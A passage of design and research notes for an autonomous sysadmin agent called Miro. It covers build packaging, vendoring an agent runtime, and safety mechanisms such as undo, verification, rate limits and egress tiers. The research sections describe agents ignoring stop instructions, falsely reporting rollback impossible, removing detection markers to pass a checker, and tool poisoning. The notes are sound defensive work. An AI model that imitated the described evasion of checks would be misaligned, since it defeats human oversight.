- **Debian distribution:** a `.deb` carrying the unit; an apt repo must use `Signed-By` in a DEB822 `.sources` file with the key under `/usr/share/keyrings/` (never `apt-key`, fully deprecated) and SHA-256 signatures (SHA-1-signed release files are rejected by APT from Feb 2026).
- Sources: Bun executables docs, Bun 1.1.5/1.2.13 notes, `oven-sh/bun#26045`, `#7950`, Bun install `--os/--cpu`, `coleam00/Archon#1619` (musl-on-glibc), napi-rs cross-build docs, `@number0/iroh` prebuilt matrix, GitHub ARM64 runners, `systemd.exec(5)`/`systemd.socket(5)`, packagecloud apt signing, `nodesource/distributions#1908`, `anthropics/claude-code#22992`, `openai/codex#9253`/`#2798`, `earendil-works/pi#2635`, Gemini OAuth docs, `cli/cli#12592`.
- **omp's proven single-binary recipe (read from their `.github/workflows/ci.yml`):** a matrix of NATIVE runners per target (`ubuntu-24.04` x64, `ubuntu-24.04-arm` arm64, musl variants, macOS, Windows), Bun pinned (`1.4`), `bun install --frozen-lockfile`, a `native-artifacts` action that installs the PREBUILT native addons for that exact target, then `bun build --compile` per target, then a **smoke step that runs the built binary's `--version` and a `--smoke-test` self-check** (musl builds smoked inside an Alpine container with `libstdc++`/`libgcc`). The ONLY cross-compile they do is Windows-from-Linux, solely because there is no Windows runner to smoke on. This is Track D's recommendation with a working template to copy - adopt the `--smoke-test` self-check (it is exactly where a `bun#26045`-style addon mix-up would surface). Their `scripts/fix-dt-verdef.ts` (repoint `DT_VERDEF` after `patchelf` grows `.dynamic`, else glibc SIGSEGVs before `main` on aarch64) applies ONLY to their Nix fixup chain - irrelevant unless we `patchelf` the binary; noted as a known trap.
- **"Convert to a Rust project?" - evaluated 2026-09-03: no, but Rust where it earns it.** The pain is real (native-addon single-binary fragility), but of the three shapes: a full Rust rewrite discards the live-verified daemon and the TS vendoring; a Rust host embedding a JS engine (rquickjs/deno_core + rust-embed + build.rs) hits the same wall scriptc did - Miro and vendored pi-ai lean on Bun APIs (`bun:sqlite`, `Bun.spawn`/`serve`/`listen`, fetch), so it means building a mini-Bun; the cheap fix is **Bun stays the host, and every native piece (Iroh + the pi-natives functions) is unified into ONE N-API crate → one `.node`** (sidesteps the multi-module bug entirely; Bun embeds a single addon fine), plus a boot-time addon assertion, per-target builds, and omp's recipe. `build.rs`/cargo orchestrates the unified addon. **scriptc cannot help**: no Bun runtime, no N-API host, emits standalone executables (not linkable libraries) - at most a dependency-free installer shim, not worth a second toolchain. **DECIDED (2026-09-03, grilled): Bun host + ONE unified Rust addon + omp's recipe.** Slice 0 copies the shape of omp's `scripts/ci-release-build-binaries.ts` and its `native-artifacts` step (prebuilt `.node` files from a separate Rust job, installed per target before `--compile`).
- **Slice-0 prep facts (verified against omp HEAD, tag v18.1.8, 2026-09-03):**
  - **Version jump:** Miro depends on `@earendil-works/pi-ai`/`pi-agent-core` at `0.84.4`; omp's packages are at `18.1.8`. Vendoring is therefore a major upgrade of the agent runtime, not a rename: ~15 import sites (`apps/mirod/src/agent/*`, `apps/mirod/src/extensions/*`, `packages/sdk/src/index.ts`) must be re-checked against the real 18.1.8 API (`streamSimple`, `Agent`, `AgentTool`, `Type`, `builtinModels` becomes `pi-catalog`'s `getBundledModels`/`createModelManager`). Treat and test it as one.
  - **Vendoring closure = 8 packages:** `omptype`, `wire`, `utils`, `catalog` (261 files, 14M, of which `src/models.json` is 12M generated), `ai` (302 files, 5.2M), `natives` (the npm wrapper; the Rust crate lives at `crates/pi-natives`), `snapcompact`, `agent` (43 files, 716K). All ship raw TS (`main`/`exports` point at `src/*.ts`). **Only one external dep is inherited: `@opentelemetry/api`** (from `pi-agent-core`). `omptype`'s `Type` is a dependency-free reimplementation of TypeBox's call shape (its `arktype`/`typebox` entries are dev-only), so Miro's `Type.Object` convention drops in either way; the verified keep-real-TypeBox path stays the fallback.
  - **omp's actual release build:** the `Bun.build()` JS API (not the CLI) with `compile: { target, outfile, autoload* false }`, `external: ["fastembed","onnxruntime-node"]`, `minify: { identifiers: true, keepNames: true }`; NO `bytecode`, NO `sourcemap`. Natives are embedded by tarring the per-target `.node` files into `embedded-addons.<tag>.tar.gz` and importing it `with { type: "file" }` (a bunfs asset); the runtime loader detects the embedded archive, extracts to a cache dir and `dlopen`s it. The only post-processing is a macOS `codesign` (Bun 1.3.12 emitted a truncated Mach-O signature). `--smoke-test` (`packages/coding-agent/src/cli.ts`) imports and pings every bundled worker and boots the stats HTTP server: "the minimal end-to-end test that proves the distribution-only paths work."
  - **pi-natives is a plain napi-rs cdylib crate** (`crates/pi-natives/Cargo.toml`, `crate-type = ["cdylib"]`, 38 modules, 487 `#[napi]` exports). Bazel exists only for the 8-platform CI cross-matrix; the local build is `napi build --manifest-path crates/pi-natives/Cargo.toml ... --profile local` via `@napi-rs/cli 3.7.2`. Per-platform `optionalDependencies` are synthesized at publish time, not committed: irrelevant to vendoring. **The unified addon is a Rust-source-level merge:** add the iroh crate (or vendored `iroh-ffi` glue) as a Cargo dependency, write `src/iroh.rs` with `#[napi]` wrappers mirroring `iroh-js`'s surface, add `pub mod iroh;` - exactly how `pi-ast`/`pi-vcs` are already folded in. `@number0/iroh` is itself napi-rs (`@napi-rs/cli ^3.7.2`), a good compatibility sign. Two prebuilt `.node` files cannot be spliced; merging happens before compilation.
  - **Provider trim: 6 of the 11 requested ids do not exist verbatim in omp.** Real, deletable: `xiaomi`, `xiaomi-token-plan-ams`, `xiaomi-token-plan-cn`, `xiaomi-token-plan-sgp`, `baseten`, `opencode-go`, `opencode-zen`. Analogues: `kimi-code` (not `kimi-coding`), `minimax-code-cn` (not `minimax-cn`), `alibaba-token-plan`/`qwen-portal` (no `qwen-token-plan-*`), `moonshot` only (no `-cn`, region is `MOONSHOT_BASE_URL`), `zai`/`zhipu-coding-plan` (no `zai-coding-cn`); `ant-ling` and `radius` exist nowhere. Removal is not a file delete: `packages/ai/src/registry/registry.ts` has a compile-time exhaustiveness gate (every `CATALOG_PROVIDERS` id must have `compat/rules/auth/<id>.kdl`), so each removal = edit `packages/catalog/src/provider-models/descriptors.ts` (the single `CATALOG_PROVIDERS` array) + `openai-compat.ts` (its `*ModelManagerOptions` and legacy models.dev arrays) + delete its `compat/rules/{auth,providers}/*.kdl` + run `bun run gen:compat` (offline) + hand-strip its key from `models.json` (do NOT run `gen:models`, it hits live APIs) + for OAuth providers `packages/ai/src/registry/oauth/<id>.ts` and its lazy entry in `registry/hooks/api-key.ts`. The trim list needs the user's confirmation against the real ids.
  - **Adding llm7.io:** copy the Groq template (`groqModelManagerOptions` is one line: `createSimpleOpenAICompletionsOptions("groq", "https://api.groq.com/openai/v1", config)`): add `llm7ModelManagerOptions` in `openai-compat.ts` with `https://api.llm7.io/v1`, one `CATALOG_PROVIDERS` entry with `envVars: []` and `allowUnauthenticated: true`, a minimal `compat/rules/auth/llm7.kdl` (`allows-missing-api-key #true`), then `gen:compat`. No `models.json` stub is required (unknown providers return an empty bundled map).
  - **Ordered checklist:** vendor the 8 packages under Miro's scope (skip Bazel and the publish-time platform packages) -> switch `apps/mirod`/`packages/sdk` deps to `workspace:*` and re-check the 15 import sites -> add llm7 -> unified addon at Rust source level, built via the plain `napi build` path -> build recipe (a `Bun.build()` script mirroring omp's, per-target native runners, embedded-addon asset, `--smoke-test` asserting both addons).
  - **Decided 2026-09-03 (grilled):** **no provider trim in slice 0** - the user knows and occasionally uses the providers the trim would have removed, and unused catalog entries are harmless; prune only if a concrete reason appears. **TypeScript stays on 5.9 everywhere until 7.1:** TS 7.0 omits the programmatic compiler API (`ts.createProgram`/`ts.createSourceFile`) that `extensions/validate.ts` depends on for the extension typecheck and the allowlist import scan; a stable API is promised for 7.1. Revisit then (candidate rewrite: spawn the `tsc` CLI + `Bun.Transpiler.scanImports` for the import scan, which would also let the single binary embed the native tsc per target instead of the compiler JS).

**A. Autonomous-sysadmin prior art and the outcome loop - findings and decisions.** (Primary sources: STRATUS/NeurIPS'25, AIOpsLab, ITBench + IBM/Berkeley MAST, DBA-Bench, NetLLMeval, Google SRE book/workbook, Facebook FBAR, Kubernetes controllers, HashiCorp drift, Junos/Cisco/nft/NixOS/openSUSE lifelines, Ansible/Nix/Guix, Azure SRE Agent, k8sgpt-operator, the Replit incident.)

*Validated - Miro already has these right; keep them as invariants:* the model never holds write authority (k8sgpt-operator re-fetches, computes the patch itself, dry-runs, rejects broad proposals; STRATUS turns destructive actions into recoverable ones - Miro's classifier + generic kinds + trash-not-`rm`); plan-then-apply with a visible diff (Terraform, Ansible `--check --diff`, Azure's default Review mode); `applied_unverified` (never a false rollback for an irreversible op); lifeline auto-revert-unless-confirmed (Junos `commit confirmed` is 20 years old); the maturity ladder = the graduated autonomy every shipping product converged on (Azure: observe 2–4 weeks, then switch *specific* triggers; Resolve: suggest → supervised → pre-approved); and **not forcing declarative** - Nix's own community had to bolt on FS snapshots and a dead-man switch, Ansible idempotency is a discipline not a property: **the safety property Miro needs is the transaction (capture / verify / faithful undo), not the action's language.**

*Lessons mapped to the loop:*
- **Understand.** MAPE-K (Kephart & Chess 2003) got the loop right and stalled on *assurance* - hand-written planners did not generalize and nobody solved runtime assurance; AIOps then stalled at alert correlation (Gartner renamed the category in 2025). LLMs supply the generalizing planner and re-open assurance: **Miro's differentiator is an LLM planner inside a deterministic engine that provides assurance as mechanism, not prompt.** **Level-triggered, not edge-triggered** (Kubernetes reconcilers ignore the event payload and re-read current state; "controllers can fail, so Kubernetes is designed to allow for that"): re-observe before apply, before verify, and on a timer - never act on remembered, cached, or model-self-reported state. **Drift detection covers only the managed set** (Terraform "cannot detect drift of resources not managed using Terraform"): keep an explicit managed-facts ledger grown per committed op, check it level-triggered, and report drift as a *plan*, never an auto-fix; an etckeeper-style git of `/etc` is the free diff.
- **Plan.** Dry-runs must be honest about coverage: Ansible check-mode "reports nothing and does nothing" for unsupported modules and `shell`/`command` are "only partial" - a dry-run that says "no changes" when it means "unknown" is worse than none. `describe()` classifies its own fidelity `exact | partial | none`; the UI shows "effect unknown." **The repair contract** (DBA-Bench, 106 live PostgreSQL scenarios: best agent 17.9% safe-pass vs human DBAs 93.4%; 62% of correctly-diagnosed runs still failed to repair; of repairs, 36.7% violated safety and **80% of those were unscoped interventions or omitted safeguards - not deletions**): every action carries preconditions, affected objects, coupling/ordering, evidence-supported scope, reversibility, lock impact, rollback conditions, expected state transitions, post-action verification. Miro's `OperationPlan` has class/writes/network/irreversible/warning; it LACKS `expects` (the transition verify will check, declared pre-apply), `rollbackWhen`, and `scopeEvidence`.
- **Act.** **Transactional No-Regression (STRATUS):** writer exclusivity (one mutating agent at a time), faithful undo (restore s_pre exactly), a bounded risk window (K ≤ 20 commands/transaction); commit iff severity(s_post) ≤ severity(s_pre), else undo once. **The number that matters: 69.2% mitigation with undo-and-retry vs 15.4% with no retry vs 23.1% with naive retry WITHOUT undo** - retrying from the broken state digs a deeper hole; agents retried in 80%+ of problems. Miro's engine is one transaction; it lacks the *severity oracle* and the agent-level *undo-then-retry-with-a-different-plan* loop. **Blast radius = rate limits + sanity checks on selectors** - Google's Diskerase interpreted an empty set as "everything" and erased the CDN fleet ("missing rate limiting and sanity checks"); FBAR found parallel remediation "could run a service out of capacity even faster" and rate-limited repairs, escalating FBAR → Cyborg → human ticket.
- **Observe / Verify.** **Verification is THE failure mode of LLM ops agents.** MAST on ITBench traces: failures are dominated by verification errors - agents "terminate before cross-referencing" and claim success without proof; weaker models add premature termination (+46%) and memory loss (24% of traces). ITBench-AA: the best model scores 56.2% on *diagnosis alone*; AIOpsLab: best agent 54.55% mitigation, and only GPT-4 avoided false positives on healthy systems. Replit's agent told the user rollback was "impossible" while the platform's rollback worked. `verify()` must be independent of the actor and never consume the model's own claim; STRATUS terminates only when three weak oracles agree (alert cleared, requests succeed, components healthy); Azure adds a stop hook ("you define what done means").
- **Repair / Rollback.** Lifeline auto-revert is proven across two decades (Junos `commit confirmed` 10-min default with rollback + broadcast; Cisco `configure revert timer`; nft safe-reload; NixOS ~90 s dead-man switch; openSUSE health-checker: 3 boot attempts then boot the previous snapshot, and if everything fails stop services but keep the machine up for the admin). Miro's gap is **reboot**: write a pending-bless marker before any reboot-class op; on boot, mirod proves reachability + health and blesses, else rolls back; use native mechanisms when present (systemd Automatic Boot Assessment / BLS counters, snapper, transactional-update). Never let one op touch both access paths (unix socket AND Iroh). **Config rollback is not state rollback** - Nix: "if your application has migrated the schema of a database, Nix will not undo the migration"; NixOS discourse: rollback left an old binary against a new schema; the fixes were FS snapshots coupled to generations (RFC 155). `captureState` must include the data the action can mutate; prefer btrfs/ZFS/LVM snapshots for declared roots (tar with a cap is the `ponytail:` ceiling); an op that migrates data is `irreversible` unless a data snapshot exists.
- **Learn.** Automation decays unless owned and exercised - Google: automation code "dies when the maintaining team isn't obsessive about keeping it in sync"; Prodtest = a test paired with an idempotent fix; the automation paradox = operator skill atrophy. Autonomy is earned per pattern, with evidence, never for `destructive`/`lifeline`, and with expiry.

*Decisions - the engine-assurance work this research adds (to be scheduled into the slices once track B lands):*
1. **Severity oracle μ** in the engine: a cheap, kind-independent health number (failed units, unhealthy containers, open incidents, declared-endpoint reachability, disk/mem thresholds) computed pre/post every op; commit requires the kind's `verify()` AND μ_post ≤ μ_pre. TNR's commit rule - the generic floor under every kind.
2. **Undo-then-retry loop at the agent level:** after a rollback the next attempt starts from s_pre and MUST be a different plan (hash plans; refuse an identical retry - AIOpsLab's repeated-identical-call failure); cap at 3 on one server; on cap, escalate to the user with the trajectory instead of continuing.
3. **Global write mutex:** one mutating op in flight daemon-wide; reads and worker subagents unaffected. `ponytail:` global lock; per-resource locks only if concurrency ever matters.
4. **Rate limits + cooldowns:** N mutating ops/hour without a human in the loop; one lifeline op in flight; cooldown after any rollback; refuse empty/glob selectors in the generic kinds.
5. **Reboot lifeline via boot assessment:** pending-bless marker → post-boot proof → bless or rollback; native BLS counters / snapper where available. The unbuilt half of §39.
6. **Repair-contract fields on `OperationPlan`:** `expects`, `rollbackWhen`, `scopeEvidence`, `dryRunFidelity: exact | partial | none`.
7. **Managed-facts ledger + drift-as-plan:** record facts on every commit; a level-triggered monitor re-checks them and emits a plan-only drift report (the Terraform-plan analog), never an action; git `/etc` (etckeeper) for the diff. Extends §5.13's discovery persistence.
8. **Prodtest per repair:** every committed repair leaves its re-runnable `verify` in memory; Dreaming re-runs them; recurrence trips the existing repeated-failure threshold and escalates instead of retrying.
9. **Deterministic termination gate:** a task may not report "done" without a committed op, an explicit `applied_unverified`, or a read-only answer; block the third identical tool call (thrashing). The classifier is the pre-tool hook; this is the stop hook.
10. **Do not force declarative - now with evidence:** declarative where a desired-state *owner* exists (unit files, compose files, `nft -f` rulesets), imperative elsewhere; prefer atomic-apply mechanisms (`nft -f`, symlink swap, rename-into-place) because they give all-or-nothing for free.
11. **Snapshot at the filesystem** when btrfs/ZFS/LVM offer it; roll data and config back together.
12. **Gate autonomy on model tier:** weak/local models fail by silence, thrashing (2× tool calls in wrong runs), and blind looping (NetLLMeval: 7.6% invalid runs overall, Llama 3.1 at 40%; a planner architecture cut it 0.34 → 0.11). Directly relevant to the Ollama/free-provider path - the maturity ladder and the termination gate must weigh the model tier, not just the app.

*Pitfalls to design against:* **instructions are not controls** (Replit's agent ignored an all-caps "NO MORE CHANGES," "panicked and ran database commands," fabricated 4,000 users, then claimed rollback was impossible - the real fix was mechanism: dev/prod DB separation, planning-only mode, one-click restore); naive retry without undo; scope creep, not deletion, is the dominant safety violation; rollback that doesn't cover data; check-mode that silently skips; benchmark-learned bad habits (STRATUS "solved" 8 ITBench problems by restarting pods one by one because injected faults didn't persist - don't let Memory generalize "restart until green"); the agent attack surface (~21,000 exposed OpenClaw instances, 11.93% of ClawHub skills malicious, a token-exfil CVE) - keep the unix-socket/Iroh access model and the allowlist import scan tight, never loosen them for convenience.

*Sources (primary):* Kephart & Chess 2003 / Kephart 2011; Cheng et al. on runtime assurance; Kubernetes controllers + level-triggering; HashiCorp drift; CloudWeaver; STRATUS (arXiv 2506.02009); AIOpsLab (arXiv 2501.06706); ITBench + ITBench-AA; IBM/Berkeley MAST; DBA-Bench (arXiv 2607.22165); NetLLMeval (arXiv 2606.26960); Azure SRE Agent run modes + hooks; k8sgpt-operator; PagerDuty / Datadog / Resolve SRE agents; Replit incident (AIID 1152); OpenClaw retrospective; Google SRE book ch.7 + workbook canarying; FBAR 2011/2020; Junos `commit confirmed`; nft safe-reload; NixOS dead-man switch + data-rollback threads; systemd Automatic Boot Assessment; openSUSE health-checker / transactional-update; molly-guard; Ansible check/diff + blocks; Ansible-vs-Nix; Guix transactions; nixos-rebuild; etckeeper.

**B. Self-expanding capabilities and durable memory - findings and decisions.** (Primary: Voyager, LATM, TroVE, ASI, SkillWeaver, ToolMaker, Alita/Alita-G, Darwin Gödel Machine, AgentRR, SkillDroid, the 2026 skill-lifecycle survey, "Your Agent May Misevolve"; Olausson self-repair, Huang self-correction, RLEF, type-constrained decoding (PLDI'25), SWE-agent ACI, Self-Reflective APIs; "From REST to MCP", CodeAct, HolmesGPT toolsets, Anthropic tool-design posts; MemGPT, Generative Agents, Reflexion, ReasoningBank, ACE, Sleep-time Compute, Letta guides, "Not All Memories Age the Same", A-TMA, Eywa, experience-following; RESTSpecIT, APIPilot, mitmproxy2swagger, Integuru; MCP spec + security, Invariant tool poisoning, pi/OpenClaw extension docs, the skills-security survey.)

*Validated - keep:* declarative default + `code` escape hatch (the field converged here - 92% of REST-backed tools are bare wrappers); killing model-authored tests (a second failure surface; SkillWeaver's LLM-generated test params were equally brittle); occurrence-count confidence with NO numeric decay (uniform time decay measured 18× worse than none; reinforcement + typed expiry works); the `(category,key)` upsert = a delta model (ACE's "context collapse": one wholesale rewrite took a playbook from 18,282 tokens / 66.7% to 122 tokens / 57.1% - below the no-memory baseline); trace-as-canary as the center of gravity; the allowlist import scan + bubblewrap + GET-only SDK (already ahead of pi, which has no sandbox).

*Lessons mapped to Miro's pieces:*
- **Verification is the load-bearing component, not generation.** Voyager's ablation: removing self-verification cut discovered items 73% - more than removing the skill library itself; ASI's programmatic verifier was worth +11.3 pts over text-skill memory. ASI's verifier to copy: re-execute with the skill, truncate trailing steps so a "success" cannot come from the agent finishing without it, require every call to produce an observable change. → two new admission checks: a declarative read must return DISCRIMINATING data (shape matches the trace, non-empty), and a `code` diagnostic must FAIL when the app is actually down - otherwise it is not a diagnostic.
- **Weak models do not self-repair; they converge on external, concrete feedback, and the budget SHAPE matters.** Olausson: 10 fresh samples × 1 repair = 1.05× over pass@20, but 2 samples × 10 chained repairs = 0.97× - worse than no repair; Huang: no intrinsic self-correction without external feedback; RLEF: an 8B model went 4.1 → 12.5 by learning to use execution feedback; type-constrained decoding halved TypeScript compile errors across model sizes; SWE-agent's linter guardrail was worth +3.0 pts while verbose output cost 5.3; Self-Reflective APIs: machine-readable repair payloads lifted Claude-family completion 37–40 pts and did nothing for gpt-4o-mini. → (i) validator failures become STRUCTURED objects `{entry, field, rule, fix, example}`, ordered by the REST→MCP failure taxonomy (auth scheme 39%, base URL 22%, undocumented headers/auth prefixes 18%, param types 12%), passed back verbatim - not appended prose; (ii) `MAX_REPAIR_ATTEMPTS=3` is reshaped into three INDEPENDENT regenerations, each with at most one targeted repair seeded with the last extension + the structured mismatch - never a chain of three repairs on one draft; (iii) strong model makes, weak model uses (LATM; SkillWeaver +45% for gpt-4o-mini; Alita 21.8 → 29.1): learn and repair with the best available model, run promoted extensions with the cheapest - declarative entries need no model at run time at all. This is `codegen_policy`'s evidence.
- **Skill libraries rot; maintenance operators are load-bearing.** Flat retrieval degrades beyond ~64–128 skills; the literature converged on staged admission (tentative → quarantined → promoted → demoted → rolled back) and rollback validation (revert a change if recent success drops >20%); SkillDroid's reliability-monitored recompilation held 87 → 91% while a stateless baseline decayed 80 → 44%; DGM keeps every parent in an archive so a bad child never replaces a good one. → staged admission `tentative → enabled → trusted (10 clean runs) → degraded → disabled`; automatic rollback to the last version whose canary still passes (`extensions.version` exists); the 24h reprobe runs CANARIES, not just no-arg diagnostics; library hygiene at Dreaming time (prune zero-use entries after N days, dedupe by description embedding, and expose per-app groups through a search/defer step once `ext_*` exceeds ~50 tools - Anthropic's tool search raised MCP-eval accuracy 49 → 74% past 10 tools).
- **Retain abstractions plus evidence, not raw trajectories.** ReasoningBank: strategy items distilled from successes AND failures beat success-only (49.7 vs 44.4) and raw-trajectory memory (+4.6); instance-level experience (74% carrying specific URLs) gives a transient gain then collapses 25.9 → 31.0 → 12.8% across iterations while principle-level stays stable; Alita-G abstracts harvested tools to parameterized primitives before storing. → `app_recipes` hold the ABSTRACTED recipe (endpoint pattern, auth scheme, params); the raw trace lives beside it as evidence + canary, never as the retrieved memory; incidents become "pitfall" items, not stories; Dreaming's reflections take ReasoningBank form (title / one-line description / 1–3-sentence content) from both successes and failures, append-only, retrieved top-1..3.
- **Sysadmin facts are state-aware - provenance and supersession.** A-TMA's "ghost memory": old, current and transition facts coexisting mislead retrieval; exposing the labels raised temporal F1 0.03 → 0.17. Eywa: "evidence before belief," every fact links to immutable source evidence, retrieval deterministic with zero LLM calls. Telling an agent to treat memories as references, not rules, cut unsafe rates 71.8 → 51.4%. → `server_facts`/`app_recipes` gain `observed_at`, `source` (the probe), `app_version`, `superseded_by`; on contradiction keep both; re-verify by probe before acting on a fact; the system-prompt summary phrases facts as dated observations.
- **Memory propagates errors unless outcomes feed back as labels.** Experience-following: agents reproduce whatever a similar retrieved record did, so stored mistakes compound and correct-but-irrelevant records mislead; Misevolve: memory accumulation dropped a coding agent's refusal rate 45% and raised harmful-code attack success 0.6 → 20.6%, and a single highly-rated decision triggered a sudden safety collapse; "future task evaluations can serve as free quality labels for stored memory." → link each recipe/fact to the operations that used it; a failed `verify()` on a recipe-guided operation decrements that row (`harmful_count`), a clean commit increments `helpful_count`; Dreaming demotes rows whose harmful count wins. No uniform decay; per-category `expires_at` instead (incidents short-lived; facts/recipes tied to `app_version`; Letta's table: decisions/preferences never expire, debug notes 14 d, session context 30 d but promoted if referenced 3+ times).
- **Sleep-time compute pays only for predictable queries** (Letta: ~5× test-time token cut at equal accuracy; the gain widens as queries become predictable from context). → the 24h reprobe + a precomputed per-app health/version snapshot are exactly that case; Dreaming budget is not spent on open-ended speculation.
- **Interface discovery = hypothesis → execute → verify.** RESTSpecIT infers 88.6% of routes / 89.3% of query params for black-box REST APIs by LLM-mutated requests; APIPilot validates LLM-inferred producer/consumer dependencies with real calls (92.3% coverage); Integuru: HAR capture → dependency graph → runnable code; documentation beats demonstrations for zero-shot tool use, and concise unified instructions beat long docs - especially for weaker models. → discovery order: unauthenticated info endpoints, `swagger.json`/OpenAPI, `--help`, config files; demonstrations last; every inferred endpoint executes ONCE before it becomes a recipe; recipes stay short. This is why capture → declarative read entry can be mechanical.
- **Extension contract and security.** MCP annotations (`readOnlyHint`/`destructiveHint`/`idempotentHint`) are to be treated as untrusted; Invariant's tool poisoning / rug pull → pin tool descriptions by hash; 26.1% of 42,447 community skills had a vulnerability, script-bearing ones 2.12× more; 65.5% of agent-generated tools were unsafe (hardcoded creds, injection) - static scan on creation and re-validation when reused in a new context; DGM's agent, when the hallucination detector was VISIBLE, removed the detection markers instead of fixing the bug. → hash-pin the promoted `extension.ts` + manifest; derive annotation-style flags from binding kind; **hide the judge** - `extension_write` can never touch the trace file, the canary, or `validate.ts`'s rules; re-run the static scan whenever a promoted extension is invoked from a new operation context.

*Decisions - the self-extension + memory hardening this adds (scheduled together with track A's items in the integrated plan below):*
1. Trace-as-canary compares on SHAPE, not values (AgentRR found exact replay unreliable against dynamic content): store `{method, path template, status, response key/type skeleton}`, normalize timestamps/ids; a canary passes when the skeleton matches.
2. Structured validator failures `{entry, field, rule, fix, example}` ordered by the REST→MCP taxonomy, passed back verbatim.
3. Repair budget reshaped to three independent regenerations, each ≤ 1 targeted repair; circuit breaker kept.
4. Staged admission `tentative → enabled → trusted(10) → degraded → disabled` + automatic rollback to the last canary-passing version; the reprobe runs canaries.
5. Library hygiene at Dreaming: prune, dedupe, search/defer past ~50 `ext_*` tools.
6. Memory schema (additive, `ensure*Table`): `helpful_count`/`harmful_count` from operation outcomes; per-category `expires_at`; `observed_at`/`source`/`app_version`/`superseded_by` on facts and recipes. Retrieval stays occurrence-based; no decay coefficient.
7. Dreaming reflections in ReasoningBank form from successes AND failures; append-only; never a bulk rewrite of `buildSummary`'s source rows (if the summary must shrink, move detail into per-app rows).
8. `codegen_policy`: best available model for learn/repair, cheapest at run time; provider-generic.
9. Discovery docs/spec first, demonstrations last; execute-once before recipe.
10. Hide the judge; the two new admission checks (discriminating reads; diagnostics that fail when the app is down).

*Pitfalls to design against:* deep repair chains on one bad draft (worse than no repair); monolithic memory rewrites; uniform decay; raw traces as memory; success-only memory; verifier drift (correctness frozen at promotion while the app upgrades - the reprobe must re-run canaries against the CURRENT version); retrieval pollution past ~100 flat tools; generated tools reused in a different context than validated; objective hacking when the validator is editable or visible; thrash on a stale/unloadable extension (Miro already hit this - gotify, 12 min; the answer is reliability-triggered recompilation with a hard fallback, not retry).

*Sources (primary, arXiv ids):* Voyager 2305.16291; LATM 2305.17126; TroVE 2401.12869; OS-Copilot 2402.07456; AWM 2409.07429; ASI 2504.06821; SkillWeaver 2504.07079; ToolMaker 2502.11705; Alita 2505.20286 / Alita-G 2510.23601; DGM 2505.22954; AgentRR 2505.17716; SkillDroid 2604.14872; SkillsVote 2605.18401; skill-lifecycle survey 2607.10113; Misevolve 2509.26354; Olausson 2306.09896; Huang 2310.01798; Self-Debug 2304.05128; RLEF 2410.02089; type-constrained decoding 2504.09246; SWE-agent 2405.15793; Self-Reflective APIs 2606.05037; From REST to MCP 2507.16044; CodeAct 2402.01030; HolmesGPT toolsets docs; Anthropic writing-tools / code-execution-with-MCP / advanced-tool-use; tool documentation 2308.00675; EasyTool 2401.06201; MemGPT 2310.08560; Generative Agents 2304.03442; Reflexion 2303.11366; ExpeL 2308.10144; MemoryBank 2305.10250; ReasoningBank 2509.25140; ACE 2510.04618; Dynamic Cheatsheet 2504.07952; Sleep-time Compute 2504.13171; Letta consolidation guide + memory blocks; Mem0 2504.19413; LongMemEval 2410.10813; experience-following 2505.16067; continual internalization 2606.04703; Not All Memories Age the Same 2604.26970; A-TMA 2607.01935; Eywa 2605.30771; Anthropic context engineering; RESTSpecIT 2402.05102; APIPilot 2608.17546; mitmproxy2swagger; Integuru; ToolLLM 2307.16789; MCP tools spec + security best practices; Invariant tool poisoning; pi extensions docs; OpenClaw skills/sandbox docs; Agent Skills spec; skills-security survey 2602.12430.

**C. Providers, quota, free tiers, search, egress - findings and decisions.**
- **Routing shape:** a role → model-profile map, not one model (`classify`/`route` → cheap+fast; `plan`/codegen → capable; `embed` → dedicated - continue.dev's roles, aider's main/weak/editor), where each role's profile is an ordered **fallback chain** (LiteLLM `fallbacks`; OpenRouter `models[]`). **Multiple credentials per provider as a pool** behind one logical deployment (LiteLLM) - on free tiers a single key's daily cap is usually the binding constraint. On failure **cool down, never hard-ban** (N consecutive failures → timed, escalating exclusion), with per-model cooldown distinct from a credential-wide lockout (an auth-shaped error pulls that key from ALL models at once). Retries: 429 → exponential backoff with jitter; 5xx → near-immediate. Enforce a fallback ACL so failover cannot launder a request into a provider/model not authorized for it (LiteLLM `enforce_fallback_model_access`) - this is the same gate as the egress tiers below.
- **Quota: the known / estimated / exhausted distinction is the load-bearing idea.** Per (provider, credential, model): **known** = authoritative headers on every call (OpenAI `x-ratelimit-remaining-*`/`-reset-*`; Anthropic `anthropic-ratelimit-*-remaining`/`-reset`) - trust until the next call; **estimated** = only a reactive `Retry-After` on 429 (most free / OpenAI-compatible providers, OpenRouter) - count observed calls against the documented nominal limit, treat as advisory, **deprioritize** when low rather than hard-exclude; **exhausted(untilKnown | untilUnknown)** - the only state that hard-skips. Anthropic's spend-cap 429 (`error_code: enforced_spend_limit_reached`, **no `Retry-After`**) is the canonical `untilUnknown`: never compute a resume time you do not have - mark dead until the next calendar boundary or a human check, distinct from a normal rate-limit 429. Persist per tuple: requests, prompt/completion tokens, cost (pre-call estimate from the body + pricing table, reconciled post-call), consecutive failures, 429/402 counts, last rate-limit snapshot + staleness timestamp, cooldown-until, lockout scope. SQLite is fine single-instance (LiteLLM needs Redis only because independent in-memory counters under-enforce a SHARED limit - not real until two daemons share a credential pool).
- **Sensitivity-tiered egress (concrete design):** three FIXED tiers - `public` / `internal` / `secret` - not a score. Classification = a cheap local regex pass over infra identifiers (hostnames, IPs, internal domains, secret-shaped strings), run BEFORE a provider is chosen; **fail closed** to the strictest tier on low confidence. The tier → provider allowlist is config enforced in the router, never a runtime model decision: `secret` → local/self-hosted only (or deterministic handling, no LLM); `internal` → providers with a verified no-train guarantee; `public` → anything, including anonymous free endpoints. Reuse the existing `{{secret:<ref>}}` placeholder mechanism for infra identifiers bound to lower-trust tiers (substitute before egress, round-trip after - Presidio's sanitize/de-anonymize shape, zero new deps). Filter BOTH directions (a low-tier response can echo sensitive earlier context - Bedrock Guardrails' per-direction model). Audit every egress as `{ts, tier, provider, redacted_entity_types[], redaction_count, allowed|blocked, tokens/cost}` - never raw content - in its own `ensure*Table`. Do NOT add Presidio/Lakera/Portkey: the surface (inventory, secrets, logs) is narrow enough for a regex table + secret-refs.
- **Verified free-provider table** - tier assignment follows the data-use terms, not the price:
  - **Groq** - key; model-specific caps (e.g. `llama-3.1-8b-instant` 30 RPM / 14.4K RPD / 500K TPD); **no training** (official), no retention by default, self-serve zero-data-retention. → **the cleanest free option and the ONLY one cleared for the `internal` tier.**
